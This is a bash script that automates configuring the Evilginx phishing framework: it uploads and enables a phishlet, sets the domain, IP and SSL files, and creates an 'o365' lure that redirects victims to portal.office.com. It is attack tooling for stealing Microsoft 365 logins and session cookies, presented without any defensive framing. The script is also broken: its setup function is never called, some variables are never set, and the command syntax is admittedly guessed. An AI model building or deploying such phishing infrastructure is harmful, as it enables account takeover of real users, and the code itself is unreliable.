#!/bin/bash
setup_evilginx() {
    echo "Setting up Evilginx for domain: $domain_name"

    # Load the phishlet
    sudo evilginx phishlets upload "$phishlet_path"

    # Enable the phishlet
    sudo evilginx phishlets enable example

    # Set up the hostname (domain or subdomain)
    sudo evilginx config domain "$subdomain"

    # Bind to the IP address
    sudo evilginx config ip "$host_ip"

    # Set up SSL using the provided certificate and key
    sudo evilginx config sslkey "$ssl_key_path"
    sudo evilginx config sslcert "$ssl_crt_path"
}

create_lure() {
    phishlet=$1
    hostname=$2
    redirect_url=$3
    
    # Create the lure
    sudo evilginx lures create "$phishlet"

    # Get the generated URL (Assuming the command outputs it)
    local lure_url
    lure_url=$(sudo evilginx lures get-url "$phishlet" "$hostname")

    # Set the redirect URL
    sudo evilginx lures redirect "$phishlet" "$redirect_url"
}

# Read configuration from config.json
config_file="config.json"
domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
ssl_key_path=$(jq -r '.EvilGinx2.SSL_Key_Path' "$config_file")
ssl_crt_path=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")


# Automate multiple lure creation
create_lure "o365" $domain_name "https://portal.office.com"
